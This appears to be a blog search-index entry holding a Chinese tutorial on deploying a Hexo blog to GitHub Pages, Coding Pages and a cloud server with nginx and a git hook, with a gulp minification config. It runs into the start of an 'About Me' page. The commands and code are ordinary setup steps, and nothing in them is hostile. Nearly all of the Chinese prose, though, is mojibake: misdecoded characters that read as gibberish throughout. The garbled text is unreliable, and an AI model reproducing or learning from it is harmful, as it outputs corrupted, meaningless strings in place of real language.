æ‰“å¼€åšå®¢ä»“åº“è®¾ç½®ï¼šhttps://github.com/\u003cGithubè´¦å·åç§°\u003e/\u003cGithubè´¦å·åç§°\u003e.github.io/settings\n2.2. åœ¨Custom domainä¸‹ï¼Œå¡«å†™è‡ªå®šä¹‰åŸŸåï¼Œç‚¹å‡»saveã€‚\n2.3. åœ¨ç«™ç‚¹ç›®å½•çš„sourceæ–‡ä»¶å¤¹ä¸‹ï¼Œåˆ›å»ºå¹¶æ‰“å¼€CNAME.txtï¼Œå†™å…¥ä½ çš„åŸŸåï¼ˆå¦‚www.simon96.onlineï¼‰ï¼Œä¿å­˜ï¼Œå¹¶é‡å‘½åä¸ºCNAMEã€‚\n  ç­‰å¾…10åˆ†é’Ÿå·¦å³ã€‚\næµè§ˆå™¨è®¿é—®è‡ªå®šä¹‰åŸŸåã€‚\nè‡³æ­¤ï¼Œæ‚¨çš„Hexoåšå®¢å·²ç»è§£æåˆ°è‡ªå®šä¹‰åŸŸåï¼Œhttps://\u003cGithubè´¦å·åç§°\u003e.github.ioä¾ç„¶å¯ç”¨ã€‚\nï¼ˆå¯åœ¨githubä»“åº“ä¸­è®¾ç½®è·³è½¬è‡³ä¸ªäººåŸŸåï¼‰\n  ç»‘å®šåŸŸå è™½ç„¶åœ¨Internetä¸Šå¯ä»¥è®¿é—®æˆ‘ä»¬çš„ç½‘ç«™ï¼Œä½†æ˜¯ç½‘å€æ˜¯GitHubæä¾›çš„:http://xxxx.github.io (çŸ¥ä¹æ’ç‰ˆå¯èƒ½ä¼šå‡ºç°\"http://\"å­—æ ·) è€Œæˆ‘ä»¬æƒ³ä½¿ç”¨æˆ‘ä»¬è‡ªå·±çš„ä¸ªæ€§åŒ–åŸŸåï¼Œè¿™å°±éœ€è¦ç»‘å®šæˆ‘ä»¬è‡ªå·±çš„åŸŸåã€‚è¿™é‡Œæ¼”ç¤ºçš„æ˜¯åœ¨é˜¿é‡Œäº‘ä¸‡ç½‘çš„åŸŸåç»‘å®šï¼Œåœ¨å›½å†…ä¸»æµçš„åŸŸåä»£ç†å‚å•†ä¹Ÿå°±é˜¿é‡Œäº‘å’Œè…¾è®¯äº‘ã€‚ç™»å½•åˆ°é˜¿é‡Œäº‘ï¼Œè¿›å…¥ç®¡ç†æ§åˆ¶å°çš„åŸŸååˆ—è¡¨ï¼Œæ‰¾åˆ°ä½ çš„ä¸ªæ€§åŒ–åŸŸåï¼Œè¿›å…¥è§£æ\nç„¶åæ·»åŠ è§£æ\nåŒ…æ‹¬æ·»åŠ ä¸‰æ¡è§£æè®°å½•ï¼Œ192.30.252.153æ˜¯GitHubçš„åœ°å€ï¼Œä½ ä¹Ÿå¯ä»¥pingä½ çš„ http://xxxx.github.io çš„ipåœ°å€ï¼Œå¡«å…¥è¿›å»ã€‚ç¬¬ä¸‰ä¸ªè®°å½•ç±»å‹æ˜¯CNAMEï¼ŒCNAMEçš„è®°å½•å€¼æ˜¯ï¼šä½ çš„ç”¨æˆ·å.http://github.io è¿™é‡Œåƒä¸‡åˆ«å¼„é”™äº†ã€‚ç¬¬äºŒæ­¥ï¼Œç™»å½•GitHubï¼Œè¿›å…¥ä¹‹å‰åˆ›å»ºçš„ä»“åº“ï¼Œç‚¹å‡»settingsï¼Œè®¾ç½®Custom domainï¼Œè¾“å…¥ä½ çš„åŸŸå\nç‚¹å‡»saveä¿å­˜ã€‚ç¬¬ä¸‰æ­¥ï¼Œè¿›å…¥æœ¬åœ°åšå®¢æ–‡ä»¶å¤¹ ï¼Œè¿›å…¥blog/sourceç›®å½•ä¸‹ï¼Œåˆ›å»ºä¸€ä¸ªè®°äº‹æœ¬æ–‡ä»¶ï¼Œè¾“å…¥ä½ çš„åŸŸåï¼Œå¯¹ï¼Œåªè¦å†™è¿›ä½ è‡ªå·±çš„åŸŸåå³å¯ã€‚å¦‚æœå¸¦æœ‰wwwï¼Œé‚£ä¹ˆä»¥åè®¿é—®çš„æ—¶å€™å¿…é¡»å¸¦æœ‰wwwå®Œæ•´çš„åŸŸåæ‰å¯ä»¥è®¿é—®ï¼Œä½†å¦‚æœä¸å¸¦æœ‰wwwï¼Œä»¥åè®¿é—®çš„æ—¶å€™å¸¦ä¸å¸¦wwwéƒ½å¯ä»¥è®¿é—®ã€‚æ‰€ä»¥å»ºè®®ï¼Œä¸è¦å¸¦æœ‰wwwã€‚è¿™é‡Œæˆ‘è¿˜æ˜¯å†™äº†www(ä¸å»ºè®®å¸¦æœ‰www):\nä¿å­˜ï¼Œå‘½åä¸ºCNAME ï¼Œæ³¨æ„ä¿å­˜æˆæ‰€æœ‰æ–‡ä»¶è€Œä¸æ˜¯txtæ–‡ä»¶ã€‚\nå®Œæˆè¿™ä¸‰æ­¥ï¼Œè¿›å…¥blogç›®å½•ä¸­ï¼ŒæŒ‰ä½shifté”®å³å‡»æ‰“å¼€å‘½ä»¤è¡Œï¼Œä¾æ¬¡è¾“å…¥ï¼š\n1 2 3  hexo clean hexo g hexo d   è¿™æ—¶å€™æ‰“å¼€æµè§ˆå™¨åœ¨åœ°å€æ è¾“å…¥ä½ çš„ä¸ªæ€§åŒ–åŸŸåå°†ä¼šç›´æ¥è¿›å…¥ä½ è‡ªå·±æ­å»ºçš„ç½‘ç«™ã€‚\næ–¹æ¡ˆä¸‰ï¼šGithubPages + CodingPages + åŸŸå GithubPages åœ¨å›½å†…è¾ƒæ…¢ï¼Œç™¾åº¦ä¸æ”¶å½•ï¼Œè€ŒCodingPages åœ¨å›½å¤–è¾ƒå¿«ã€‚æ‰€ä»¥åœ¨æ–¹æ¡ˆäºŒçš„åŸºç¡€ä¸Šï¼Œæ·»åŠ CodingPages ã€‚\n  åˆ›å»ºCodingè´¦å·\n  åˆ›å»ºä»“åº“ï¼Œ ä»“åº“åä¸ºï¼š\u003cCodingè´¦å·åç§°\u003e\n  è¿›å…¥é¡¹ç›®é‡Œã€ä»£ç ã€é¡µé¢ï¼Œç‚¹å‡»ã€ä¸€é”®å¼€å¯é™æ€ Pagesã€ï¼Œç¨ç­‰ç‰‡åˆ»CodingPageså³å¯éƒ¨ç½²æˆåŠŸã€‚\n  å°†æœ¬åœ°Hexoåšå®¢æ¨é€åˆ°CodingPages\n4.1. é‰´äºåˆ›å»ºGithubPages æ—¶ï¼Œå·²ç»ç”Ÿæˆè¿‡å…¬é’¥ã€‚å¯ç›´æ¥å¤åˆ¶å¯†é’¥æ–‡ä»¶å†…å®¹ï¼ˆè·¯å¾„å½¢å¦‚C:\\Users\\Administrator\\.ssh\\id_rsa.pubï¼‰ï¼Œ ç²˜è´´åˆ°æ–°å¢å…¬é’¥ã€‚\n4.2. æµ‹è¯•æ˜¯å¦æ·»åŠ æˆåŠŸã€‚åœ¨å‘½ä»¤è¡Œï¼ˆå³Git Bashï¼‰ä¾æ¬¡è¾“å…¥ä»¥ä¸‹å‘½ä»¤ï¼Œè¿”å›â€œYou've successfully authenticatedâ€å³æˆåŠŸï¼š\n$ ssh -T git@git.coding.net $ yes 4.3. ä¿®æ”¹_config.ymlï¼ˆåœ¨å­˜æ”¾Hexoåˆå§‹åŒ–æ–‡ä»¶çš„è·¯å¾„ä¸‹ï¼‰ã€‚æ–‡ä»¶æœ«å°¾ä¿®æ”¹ä¸ºï¼š\n# Deployment ## Docs: https://hexo.io/docs/deployment.html deploy: - type: git repo: git@github.com:\u003cGithubè´¦å·åç§°\u003e/\u003cGithubè´¦å·åç§°\u003e.github.io.git branch: master - type: git repo: git@git.dev.tencent.com:\u003cCodingè´¦å·åç§°\u003e/\u003cCodingè´¦å·åç§°\u003e.git branch: master 4.4. æ¨é€åˆ°GithubPagesã€‚åœ¨å‘½ä»¤è¡Œï¼ˆå³Git Bashï¼‰ä¾æ¬¡è¾“å…¥ä»¥ä¸‹å‘½ä»¤ï¼Œ è¿”å›INFO Deploy done: gitå³æˆåŠŸæ¨é€ï¼š\n$ hexo g $ hexo d   åŸŸåè§£æ\n  æ·»åŠ  CNAME è®°å½•æŒ‡å‘ \u003cCodingè´¦å·åç§°\u003e.coding.me\nç±»å‹é€‰æ‹©ä¸º CNAMEï¼›\nä¸»æœºè®°å½•å³åŸŸåå‰ç¼€ï¼Œå¡«å†™ä¸ºwwwï¼›\nè®°å½•å€¼å¡«å†™ä¸ºè‡ªå®šä¹‰åŸŸåï¼›\nè§£æçº¿è·¯ï¼ŒTTL é»˜è®¤å³å¯ã€‚\n  æ·»åŠ  ä¸¤æ¡A è®°å½•æŒ‡å‘ 192.30.252.153å’Œ192.30.252.154\nç±»å‹é€‰æ‹©ä¸º Aï¼›\nä¸»æœºè®°å½•å³åŸŸåå‰ç¼€ï¼Œå¡«å†™ä¸º@ï¼›\nè®°å½•å€¼å¡«å†™ä¸º192.30.252.153å’Œ192.30.252.154ï¼›\nè§£æçº¿è·¯ï¼Œå¢ƒå¤–æˆ–è°·æ­Œã€‚\n  åœ¨ã€Pages æœåŠ¡ã€è®¾ç½®é¡µï¼ˆhttps://dev.tencent.com/u/\u003cCodingè´¦å·åç§°\u003e/p/\u003cCodingè´¦å·åç§°\u003e/git/pages/settingsï¼‰ä¸­ç»‘å®šè‡ªå®šä¹‰åŸŸåã€‚\n    è‡³æ­¤ï¼Œæ‚¨çš„Hexoåšå®¢å·²ç»è§£æåˆ°è‡ªå®šä¹‰åŸŸåï¼Œhttps://\u003cGithubè´¦å·åç§°\u003e.github.ioå’Œhttps://\u003cCodingè´¦å·åç§°\u003e.coding.meä¾ç„¶å¯ç”¨ã€‚\næ–¹æ¡ˆå››ï¼šäº‘æœåŠ¡å™¨ + åŸŸå è¯¥æ–¹æ¡ˆéœ€è¦å…ˆè´­ä¹°äº‘æœåŠ¡å™¨å’ŒåŸŸåã€‚\n  åœ¨äº‘æœåŠ¡å™¨å®‰è£…Git å’Œ Nginxã€‚(Git ç”¨äºç‰ˆæœ¬ç®¡ç†å’Œéƒ¨ç½²ï¼ŒNginx ç”¨äºé™æ€åšå®¢æ‰˜ç®¡ã€‚)\nç™»é™†rootç”¨æˆ·ï¼Œè¿è¡Œï¼š\n$ yum -y update $ yum install -y git nginx   Nginxé…ç½®\n2.1. åˆ›å»ºæ–‡ä»¶ç›®å½•(ç”¨äºåšå®¢ç«™ç‚¹æ–‡ä»¶å­˜æ”¾)\ncd /usr/local/ mkdir hexo chmod 775 -R /usr/local/hexo/ 2.2. æ·»åŠ  index.html(ç”¨äºæ£€æµ‹é…ç½® Nginx æ˜¯å¦æˆåŠŸ)\nvim /usr/local/hexo/index.html æ·»åŠ ä»¥ä¸‹ä»£ç ï¼Œå¹¶ä¿å­˜ã€‚\n\u003c!DOCTYPE html\u003e \u003chtml\u003e \u003chead\u003e \u003ctitle\u003e\u003c/title\u003e \u003cmeta charset=\"UTF-8\"\u003e \u003c/head\u003e \u003cbody\u003e \u003cp\u003eNginx running\u003c/p\u003e \u003c/body\u003e \u003c/html\u003e 2.3. é…ç½® Nginx æœåŠ¡å™¨\nvim /etc/nginx/nginx.conf ä¿®æ”¹server_nameå’Œrootï¼š\nserver { listen 80 default_server; listen [::]:80 default_server; server_name www.baidu.com; # å¡«ä¸ªäººåŸŸå root /usr/local/hexo/; } 2.4. å¯åŠ¨nginxæœåŠ¡ï¼›\nservice nginx start 2.5. äº‘æœåŠ¡å™¨æµè§ˆå™¨è®¿é—®ä¸ªäººåŸŸåæˆ–IPï¼Œè‹¥è·³è½¬index.htmlï¼Œåˆ™é…ç½®å®Œæˆï¼Œå¦åˆ™æ£€æŸ¥ä»¥ä¸Šé…ç½®ã€‚\n  gité…ç½®\n3.1. åˆ›å»ºæ–‡ä»¶ç›®å½•, ç”¨äºç§äºº Git ä»“åº“æ­å»º, å¹¶æ›´æ”¹ç›®å½•è¯»å†™æƒé™ã€‚\ncd /usr/local/ mkdir hexoRepo chmod 775 -R /usr/local/hexoRepo/ 3.2. Git åˆå§‹åŒ–è£¸åº“ã€‚\ncd hexoRepo/ git init --bare hexo.git 3.3. åˆ›å»º Git é’©å­(hook)ã€‚\nvim /usr/local/hexoRepo/hexo.git/hooks/post-receive 3.4. è¾“å…¥ä»¥ä¸‹ä¿¡æ¯ï¼Œç”¨äºæŒ‡å®š Git çš„æºä»£ç  å’Œ Git é…ç½®æ–‡ä»¶ã€‚\n#!/bin/bash git --work-tree=/usr/local/hexo --git-dir=/usr/local/hexoRepo/hexo.git checkout -f 3.5. ä¿å­˜å¹¶é€€å‡ºå, ç»™è¯¥æ–‡ä»¶æ·»åŠ å¯æ‰§è¡Œæƒé™ã€‚\nchmod +x /usr/local/hexoRepo/hexo.git/hooks/post-receive   æœ¬åœ°åšå®¢æ¨é€åˆ°äº‘æœåŠ¡å™¨\n4.1. å®‰è£…hexo-deployer-gitæ’ä»¶ã€‚åœ¨å‘½ä»¤è¡Œï¼ˆå³Git Bashï¼‰è¿è¡Œä»¥ä¸‹å‘½ä»¤å³å¯ï¼š\n$ npm install hexo-deployer-git --save 4.2. æ·»åŠ SSH keyã€‚\n  åˆ›å»ºä¸€ä¸ª SSH key ã€‚åœ¨å‘½ä»¤è¡Œï¼ˆå³Git Bashï¼‰è¾“å…¥ä»¥ä¸‹å‘½ä»¤ï¼Œ å›è½¦ä¸‰ä¸‹å³å¯ï¼š\n$ ssh-keygen -t rsa -C \"é‚®ç®±åœ°å€\"   æ·»åŠ åˆ° githubã€‚ å¤åˆ¶å¯†é’¥æ–‡ä»¶å†…å®¹ï¼ˆè·¯å¾„å½¢å¦‚C:\\Users\\Administrator\\.ssh\\id_rsa.pubï¼‰ï¼Œç²˜è´´åˆ°New SSH Keyå³å¯ã€‚\n  æµ‹è¯•æ˜¯å¦æ·»åŠ æˆåŠŸã€‚åœ¨å‘½ä»¤è¡Œï¼ˆå³Git Bashï¼‰ä¾æ¬¡è¾“å…¥ä»¥ä¸‹å‘½ä»¤ï¼Œè¿”å›â€œYou've successfully authenticatedâ€å³æˆåŠŸï¼š\n$ ssh -T git@github.com $ yes   4.3. ä¿®æ”¹_config.ymlï¼ˆåœ¨ç«™ç‚¹ç›®å½•ä¸‹ï¼‰ã€‚æ–‡ä»¶æœ«å°¾ä¿®æ”¹ä¸ºï¼š\n# Deployment ## Docs: https://hexo.io/docs/deployment.html deploy: type: git repo: root@xxx.xxx.xxx.xxx:/usr/local/hexoRepo/hexo //ç”¨æˆ·å@åŸŸåæˆ– IP åœ°å€:/usr/local/hexoRepo/hexo branch: master æ³¨æ„ï¼šä¸Šé¢ä»“åº“åœ°å€å†™sshåœ°å€ï¼Œä¸å†™httpåœ°å€ã€‚\n4.4. æ¨é€åˆ°GithubPagesã€‚åœ¨å‘½ä»¤è¡Œï¼ˆå³Git Bashï¼‰ä¾æ¬¡è¾“å…¥ä»¥ä¸‹å‘½ä»¤ï¼Œ è¿”å›INFO Deploy done: gitå³æˆåŠŸæ¨é€ï¼š\n$ hexo g $ hexo d   ç­‰å¾…1åˆ†é’Ÿå·¦å³ï¼Œæµè§ˆå™¨è®¿é—®ä¸ªäººåŸŸåã€‚\nè‡³æ­¤ï¼Œæ‚¨çš„Hexoåšå®¢å·²ç»æ­å»ºåœ¨äº‘æœåŠ¡å™¨, åŸŸåä¸ºä¸ªäººåŸŸåã€‚\n  Hexoå¸¸ç”¨å‘½ä»¤ 1 2 3 4 5 6 7 8 9  hexo new \"postName\" #æ–°å»ºæ–‡ç«  hexo new page \"pageName\" #æ–°å»ºé¡µé¢ hexo clean #æ¸…é™¤éƒ¨ç½²ç·©å­˜ hexo n == hexo new #æ–°å»ºæ–‡ç«  hexo g == hexo generate #ç”Ÿæˆé™æ€é¡µé¢è‡³publicç›®å½• hexo s == hexo server #å¼€å¯é¢„è§ˆè®¿é—®ç«¯å£ï¼ˆé»˜è®¤ç«¯å£4000ï¼Œå¯åœ¨æµè§ˆå™¨è¾“å…¥localhost:4000é¢„è§ˆï¼‰ hexo d == hexo deploy #å°†.deployç›®å½•éƒ¨ç½²åˆ°GitHub hexo g -d #ç”ŸæˆåŠ éƒ¨ç½² hexo g -s #ç”ŸæˆåŠ é¢„è§ˆ   **æ³¨ï¼š**å½“æœ¬åœ°é¢„è§ˆå’Œè¿œç¨‹éƒ¨ç½²çš„æµè§ˆç»“æœä¸åŒçš„æ—¶å€™ï¼Œä¸å¦¨ä½¿ç”¨hexo clean \u0026\u0026 hexo g -dè¯•è¯•ã€‚\nåˆ›å»ºæ–‡ç«  å‘½ä»¤ï¼š\n$ hexo new [layout] \u003ctitle\u003e å¤åˆ¶ä»£ç  å‚æ•°è¯´æ˜ï¼š\n [layout]å¯ä»¥ä¸ºä»¥ä¸‹ä¸‰ç§ï¼š     å‚æ•°å åŠŸèƒ½ æ–‡ç« è·¯å¾„     post æ–°å»ºåšæ–‡ source/_posts   page æ–°å»ºé¡µé¢ï¼ˆå¦‚404ï¼Œåˆ†ç±»ï¼‰ source   draft è‰ç¨¿ source/_drafts    è‰ç¨¿å¯é€šè¿‡ä¸€ä¸‹å‘½ä»¤å‘å¸ƒï¼š\n$ hexo publish [layout] \u003ctitle\u003e å¤åˆ¶ä»£ç    titleæ³¨æ„ï¼š\nä¸æ˜¯åšæ–‡æ ‡é¢˜ï¼Œ\næ˜¯åšæ–‡markdownæ–‡ä»¶çš„åå­—ï¼Œ\nä¹Ÿæ˜¯åšæ–‡é“¾æ¥çš„åç¼€ï¼ˆå¦‚https://www.simon96.online/2018/10/12/hexo-tutorial/ä¸­çš„hexo-tutorialï¼‰\n  æ–‡ç« æ¨¡ç‰ˆ   åˆ›å»ºæ¨¡ç‰ˆ\nåœ¨æ–°å»ºæ–‡ç« æ—¶ï¼ŒHexo ä¼šæ ¹æ® scaffolds æ–‡ä»¶å¤¹å†…ç›¸å¯¹åº”çš„æ–‡ä»¶æ¥å»ºç«‹æ–‡ä»¶ï¼Œä¾‹å¦‚ï¼š\n   $ hexo new blog \"simon\"\n â€‹\tåœ¨æ‰§è¡Œè¿™è¡ŒæŒ‡ä»¤æ—¶ï¼ŒHexo ä¼šå°è¯•åœ¨ scaffolds æ–‡ä»¶å¤¹ä¸­å¯»æ‰¾ blog.mdï¼Œå¹¶æ ¹æ®å…¶å†…å®¹å»ºç«‹æ–‡ç« ã€‚\n  ä¿®æ”¹å‚æ•°\nä»¥ä¸‹æ˜¯æ‚¨å¯ä»¥åœ¨æ¨¡ç‰ˆä¸­ä½¿ç”¨çš„å˜é‡ï¼š\n     å˜é‡ æè¿°     layout å¸ƒå±€   title æ ‡é¢˜   date æ–‡ä»¶å»ºç«‹æ—¥æœŸ    Front-matter å°±æ˜¯åšæ–‡æœ€ä¸Šæ–¹ä»¥ --- åˆ†éš”çš„é‚£éƒ¨åˆ†ã€‚\né»˜è®¤å¯ä»¥ä½¿ç”¨çš„Front-matterï¼š\n   å‚æ•° æè¿° é»˜è®¤å€¼     layout å¸ƒå±€    title æ ‡é¢˜    date å»ºç«‹æ—¥æœŸ æ–‡ä»¶å»ºç«‹æ—¥æœŸ   updated æ›´æ–°æ—¥æœŸ æ–‡ä»¶æ›´æ–°æ—¥æœŸ   comments å¼€å¯æ–‡ç« çš„è¯„è®ºåŠŸèƒ½ true   tags æ ‡ç­¾ï¼ˆä¸é€‚ç”¨äºåˆ†é¡µï¼‰    categories åˆ†ç±»ï¼ˆä¸é€‚ç”¨äºåˆ†é¡µï¼‰    permalink è¦†ç›–æ–‡ç« ç½‘å€     ä¸»é¢˜é…ç½® hexoä¸»é¢˜wiki\nå¯ä»¥åœ¨æ­¤å¤„å¯»æ‰¾è‡ªå·±å–œæ¬¢çš„ä¸»é¢˜ä¸‹è½½æ‰€æœ‰çš„ä¸»é¢˜æ–‡ä»¶ï¼Œä¿å­˜åˆ°Hexoç›®å½•ä¸‹çš„themesæ–‡ä»¶å¤¹ä¸‹ã€‚ç„¶ååœ¨_config.ymlæ–‡ä»¶ä¸­ä¿®æ”¹ï¼š\n# Extensions ## Plugins: http://hexo.io/plugins/ ## Themes: http://hexo.io/themes/ theme: landscape //themesæ–‡ä»¶å¤¹ä¸­å¯¹åº”æ–‡ä»¶å¤¹çš„åç§° ç„¶åå…ˆæ‰§è¡Œhexo cleanï¼Œç„¶åé‡æ–°hexo gï¼Œå¹¶ä¸”hexo dï¼Œå¾ˆå¿«å°±èƒ½çœ‹åˆ°æ–°ä¸»é¢˜çš„æ•ˆæœäº†~\nä¸»é¢˜ä¼˜åŒ–   è®¾ç½®ã€ŒRSSã€\n  æ·»åŠ ã€Œæ ‡ç­¾ã€é¡µé¢\n  æ·»åŠ ã€Œåˆ†ç±»ã€é¡µé¢\n  è®¾ç½®ã€Œå­—ä½“ã€\n  è®¾ç½®ã€Œä»£ç é«˜äº®ä¸»é¢˜ã€\n  ä¾§è¾¹æ ç¤¾äº¤é“¾æ¥\né—®é¢˜ï¼šå›¾æ ‡å“ªé‡Œæ‰¾ï¼Ÿ\nè§£å†³ï¼šFont Awesome\n  å¼€å¯æ‰“èµåŠŸèƒ½\né—®é¢˜ï¼šå¾®ä¿¡æ”¯ä»˜å®äºŒç»´ç ä¸ç¾è§‚ï¼Œè§„æ ¼ä¸ä¸€ã€‚\nè§£å†³ï¼šåœ¨çº¿ç”ŸæˆäºŒç»´ç \n  è®¾ç½®å‹æƒ…é“¾æ¥\n  æ·»åŠ ä¸ªäººè”ç³»æ–¹å¼\n  è…¾è®¯å…¬ç›Š404é¡µé¢\n  ç«™ç‚¹å»ºç«‹æ—¶é—´\n  è®¢é˜…å¾®ä¿¡å…¬ä¼—å·\n  è®¾ç½®ã€ŒåŠ¨ç”»æ•ˆæœã€\né—®é¢˜ï¼šæ…¢ï¼Œéœ€è¦ç­‰å¾… JavaScript è„šæœ¬å®Œå…¨åŠ è½½å®Œæ¯•åæ‰ä¼šæ˜¾ç¤ºå†…å®¹ã€‚ è§£å†³ï¼šå°†ä¸»é¢˜é…ç½®æ–‡ä»¶_config.ymlä¸­ï¼Œuse_motionå­—æ®µçš„å€¼è®¾ä¸º false æ¥å…³é—­åŠ¨ç”»ã€‚\n  è®¾ç½®ã€ŒèƒŒæ™¯åŠ¨ç”»ã€\n  æ·»åŠ èƒŒæ™¯å›¾\n  ä¿®æ”¹Logoå­—ä½“\n  ä¿®æ”¹å†…å®¹åŒºåŸŸçš„å®½åº¦\n  ç½‘ç«™æ ‡é¢˜æ èƒŒæ™¯é¢œè‰²\n  è‡ªå®šä¹‰é¼ æ ‡æ ·å¼\n  æ–‡ç« åŠ å¯†è®¿é—®\n  å®ç°ç‚¹å‡»å‡ºç°æ¡ƒå¿ƒæ•ˆæœ\n  é™æ€èµ„æºå‹ç¼©ï¼ˆåšæ–‡å‹ç¼©ï¼‰\n  ä¿®æ”¹è®¿é—®urlè·¯å¾„\n  åšæ–‡ç½®é¡¶\n  åœ¨å³ä¸Šè§’æˆ–å·¦ä¸Šè§’å®ç°fork me on github\n  ä¸»é¡µæ–‡ç« æ·»åŠ è¾¹æ¡†é˜´å½±æ•ˆæœ\n  æ˜¾ç¤ºå½“å‰æµè§ˆè®°å½•\n  å¸¸è§åˆ†ç±»é¡µ\n  åŠ å…¥å¹¿å‘Š\n  æ·»åŠ èŒèŒå“’\n  æœç´¢åŠŸèƒ½\n  ç½‘æ˜“äº‘å¤–é“¾æ’­æ”¾å™¨\n  èŠ±é‡Œèƒ¡å“¨çš„ç©æ„å„¿\n  ä¿®æ”¹ä½œè€…å¤´åƒå¹¶æ—‹è½¬\n  ä¿®æ”¹``ä»£ç å—è‡ªå®šä¹‰æ ·å¼\n  ç‚¹å‡»çˆ†ç‚¸æ•ˆæœ\n  æ·»åŠ èŒå¦¹å­åŠ¨å›¾\n  ä¾§æ è®¾ç½®\n  é€æ˜èƒŒæ™¯è®¾ç½®\n  æ·»åŠ é˜…è¯»å…¨æ–‡\n  è®¾ç½®ç½‘ç«™ç¼©ç•¥å›¾æ ‡\n  æ·»åŠ ç«™ç‚¹è®¿é—®è®¡æ•°\n  å‰å‡ ä¸ªå¯å‚è€ƒnextå®˜æ–¹æ–‡æ¡£é…ç½®\nï¼ˆä»¥ä¸‹ç”¨åˆ°å¤–éƒ¨å·¥å…·ï¼‰\nè¯„è®ºç³»ç»Ÿ\næ•°æ®ç»Ÿè®¡ä¸åˆ†æ\nå†…å®¹åˆ†äº«æœåŠ¡\næ–‡ç« åŠ å¯†è®¿é—®\nhexo-blog-encrypt\nSEO Hexo NexT ä¸»é¢˜SEOä¼˜åŒ–æŒ‡å—\nseoè¿™ä¸œè¥¿æ˜¯ä½¿è‡ªå·±çš„æ–‡ç« èƒ½è¢«ç™¾åº¦ã€è°·æ­Œæœå½•ï¼Œèƒ½è¢«æœç´¢åˆ°ã€‚\nå› ä¸ºæš‚æ—¶ä¸æƒ³è¢«æœåˆ°/dogeï¼Œæ‰€æœ‰æš‚ä¸é…ç½®\nGitPage å›½å†…ä¼˜åŒ– å‚è€ƒå¤§ä½¬çš„åšå®¢ï¼šhttps://blog.lgf.im/2020/03/speedup-github-page/#\n  å¯¹äºhtml/js/cssçš„å‹ç¼©ï¼šgulp\n1 2 3 4 5 6 7 8 9 10 11  $ # æœ¬æœºå®‰è£… $ npm install gulp -g $ #ä¸ºäº†github Action å’Œå…¶ä»–CI\\CDå¹³å°ä¹Ÿèƒ½è¿›è¡Œå®‰è£…ï¼Œæ¨è $ npm install gulp --save-dev $ # å®‰è£…ä¾èµ– $ npm install gulp-minify-css \\  gulp-babel \\  gulp-uglify \\  gulp-htmlmin \\  gulp-htmlclean \\  --save-dev    åˆ›å»ºé…ç½®æ–‡ä»¶ï¼šåœ¨åšå®¢hexoçš„æ ¹ç›®å½•ä¸‹ï¼Œæ–°å»º gulpfile.js é…ç½®æ–‡ä»¶  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56  var gulp = require('gulp'); var minifycss = require('gulp-minify-css'); var uglify = require('gulp-uglify'); var htmlmin = require('gulp-htmlmin'); var htmlclean = require('gulp-htmlclean'); var imagemin = require('gulp-imagemin'); // å‹ç¼©cssæ–‡ä»¶ gulp.task('minify-css', function() { return gulp.src('./public/**/*.css') .pipe(minifycss()) .pipe(gulp.dest('./public')); }); // å‹ç¼©html gulp.task('minify-html', function() { return gulp.src('./public/**/*.html') .pipe(htmlclean()) .pipe(htmlmin({ collapseWhitespace: true, collapseBooleanAttributes: true, removeComments: true, removeEmptyAttributes: true, removeScriptTypeAttributes: true, removeStyleLinkTypeAttributes: true, minifyJS: true, minifyCSS: true, minifyURLs: true, ignoreCustomFragments: [ /\\{\\{[\\s\\S]*?\\}\\}/ ], })) .pipe(gulp.dest('./public')); }); // å‹ç¼©jsæ–‡ä»¶ gulp.task('minify-js', function() { return gulp.src(['./public/**/*.js','!./public/js/**/*min.js']) .pipe(uglify()) .pipe(gulp.dest('./public')); }); // å‹ç¼©å›¾ç‰‡ gulp.task('minify-images', function() { return gulp.src(['./public/**/*.png', './public/**/*.jpg', './public/**/*.gif', './public/**/*.svg']) .pipe(imagemin({ optimizationLevel: 5, //ç±»å‹ï¼šNumber é»˜è®¤ï¼š3 å–å€¼èŒƒå›´ï¼š0-7ï¼ˆä¼˜åŒ–ç­‰çº§ï¼‰  progressive: true, //ç±»å‹ï¼šBoolean é»˜è®¤ï¼šfalse æ— æŸå‹ç¼©jpgå›¾ç‰‡  interlaced: false, //ç±»å‹ï¼šBoolean é»˜è®¤ï¼šfalse éš”è¡Œæ‰«ægifè¿›è¡Œæ¸²æŸ“  multipass: false, //ç±»å‹ï¼šBoolean é»˜è®¤ï¼šfalse å¤šæ¬¡ä¼˜åŒ–svgç›´åˆ°å®Œå…¨ä¼˜åŒ–  })) .pipe(gulp.dest('./public')); }); gulp.task('default', gulp.series(gulp.parallel('minify-html', 'minify-css', 'minify-js', 'minify-images')));   gulp å‹ç¼©å®Œä¹‹åå¿«äº†50%\n  cdnåŠ é€Ÿ æˆ‘çš„åšå®¢è¿˜æ²¡åº”ç”¨ï¼Œå…ˆmarkä¸€ä¸‹ï¼Œå¯ä»¥ç”¨jsDelivrè¿›è¡ŒCDNåˆ†å‘ jsDelivr æ˜¯ä¸€å®¶å¼€æºå…è´¹CDNï¼Œä¸»è¦æ˜¯å¯¹npmåŒ…è¿›è¡ŒCDNåˆ†å‘ ç»å¦™çš„æ˜¯å®ƒè¿˜èƒ½å¯¹Githubå’ŒWordpressè¿›è¡ŒCDNåˆ†å‘ æˆ‘ä»¬å¯ä»¥å€ŸåŠ© jsDelivr çš„ Githubèµ„æºåˆ†å‘ æœåŠ¡æ¥å¯¹æˆ‘ä»¬åšå®¢ä¸­çš„css\\js\\å°å›¾ç‰‡è¿›è¡ŒåŠ é€Ÿ\n  åŠ è½½æ—¶æ–‡å­—å¯è§\n  ä½¿ç”¨æ‡’åŠ è½½\n   æ–°å¢Pageæ›´æ”¹å›¾æ ‡ hexo new page \"xxx\"\nç„¶ååœ¨ä¸»é¢˜é…ç½®_config.ymlä¸­çš„menué¡¹ä¸­è¿™ä¹ˆå†™\nxxx: /xxx/ || to_icon to_iconä¸ºå›¾æ ‡ï¼Œå›¾æ ‡å¯ä»¥åœ¨è¿™æ‰¾ï¼šhttps://fontawesome.com/\n","description":"","tags":["hexo"],"title":"hexo+gitpages","uri":"/posts/hexo-gitpages/"},{"categories":null,"content":"I wanna try everything You will see a different me Your browser does not support the audio element.   function play(){ var myVideo=document.getElementById(\"bgmusic\"); myVideo.volume=0.1; myVideo.play(); } window.onload=play;  About Me Hiï¼ŒI'm Magic.\nIâ€™m a student now.\nAccording to my nameï¼Œyou must know that I love magic very much.\nAnd I believe computer is also an art of magic. It's worthy to know more about computer.\nOn the other handï¼Œ I am also interesting in Game(especially FPS 